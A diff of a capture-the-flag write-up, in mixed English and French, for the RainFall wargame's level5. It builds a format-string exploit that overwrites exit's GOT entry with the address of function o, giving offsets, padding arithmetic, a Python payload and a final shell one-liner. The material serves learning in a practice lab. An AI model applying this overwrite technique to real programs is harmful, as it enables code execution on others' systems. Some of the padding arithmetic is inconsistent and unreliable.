@@ -1,15 +1,3 @@
-### TIPS
-
-Pour lancer un payload dans gdb
-
-```bash
-(gdb) run < <(python -c 'print ("salut" * 5)';)
-Starting program: /home/user/level5/level5 < <(python -c 'print ("salut" * 5)';)
-salutsalutsalutsalutsalut
-```
-
----
-
 ```bash
 evel5@RainFall:~$ readelf -s level5 | grep o
 Symbol table '.dynsym' contains 10 entries:
@@ -38,32 +26,28 @@ level5@RainFall:~$ objdump -R level5 | grep exit
 08049838 R_386_JUMP_SLOT   exit
 ```
 
-offset of buffer of printf is `3` --> 4 je crois
-
----
-
-```bash
-level5@RainFall:~$ objdump -R level5 | grep exit
-08049828 R_386_JUMP_SLOT   _exit
-08049838 R_386_JUMP_SLOT   exit
-```
-
 Address of exit is `08049838` == `\x38\x98\x04\x08`
 
-### Payload
+offset of buffer of printf is `4`
 
-## Option 1
+## Payload
+
+### Option 1
 
 value to write = adress of o = `0x080484a4` = `134513828`
 
 Lets do 2 writes
 
 value 1: `0x 0000 84a4` = `33956`
-value 2: `0x 0001 0804` = `67588`
+value 2: `0x 0000 0804` = `2052`
 
 cible 1 = `08049838` == `\x38\x98\x04\x08`
-
 cible 2 = cible1 + 2 == `804983A` == `\x3a\x98\x04\x08`
+
+value 2 > value 1.  
+Lets overflow it
+value2 = 2052 - 33956 = -31904 --> 33632 in uint with overflow
+
 
 ```python
 exploit = ""
@@ -71,7 +55,7 @@ exploit += "\x38\x98\x04\x08"	//cible1
 exploit += "\x3a\x98\x04\x08"	//cible2
 exploit += "%33948x"			// padding to get to value 1 (33956 - 8 = 33948)
 exploit += "%4$hn"				//write cible 1
-exploit += "%33624x"			//paddding to get to value 2 (67588 - 33956 - 8 = 33624)
+exploit += "%33632x"			//paddding to get to value 2 
 exploit += "%5$hn"
 ```
 
@@ -138,4 +122,16 @@ It'ill be : \x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn
 
 ```bash
 (python -c 'print ("\x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn")';cat) | ./level5
+```
+
+
+
+### TIPS
+
+Pour lancer un payload dans gdb
+
+```bash
+(gdb) run < <(python -c 'print ("salut" * 5)';)
+Starting program: /home/user/level5/level5 < <(python -c 'print ("salut" * 5)';)
+salutsalutsalutsalutsalut
 ```
